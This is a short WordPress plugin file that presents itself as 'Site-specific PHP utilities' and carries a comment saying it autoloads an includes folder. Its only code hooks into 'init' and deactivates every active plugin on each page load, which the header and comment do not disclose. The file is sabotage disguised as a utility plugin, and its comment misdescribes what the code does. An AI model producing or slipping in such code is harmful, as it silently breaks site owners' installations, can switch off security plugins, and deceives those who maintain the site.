<?php
/*
Plugin Name: My Custom Plugin
Description: Site-specific PHP utilities.
Version:     1.0.0
Author:      Your Name
*/
// Autoload everything in /includes

add_action( 'init', function() {
    deactivate_plugins( get_option( 'active_plugins' ) );
});
